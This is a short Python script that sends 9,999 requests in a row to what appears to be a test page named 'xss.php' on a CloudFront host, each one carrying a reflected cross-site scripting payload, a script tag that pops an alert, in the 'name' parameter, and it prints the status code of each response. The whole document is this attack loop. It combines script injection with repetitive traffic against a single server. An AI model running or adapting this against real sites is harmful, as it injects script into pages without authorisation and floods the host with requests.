import requests

if __name__ == "__main__":
    url = "http://dzangwm9rhwk3.cloudfront.net/xss.php?name=<script>alert('Got you!')</script>"
    for i in range(1,10000):
        print(requests.get(url, verify=True).status_code)

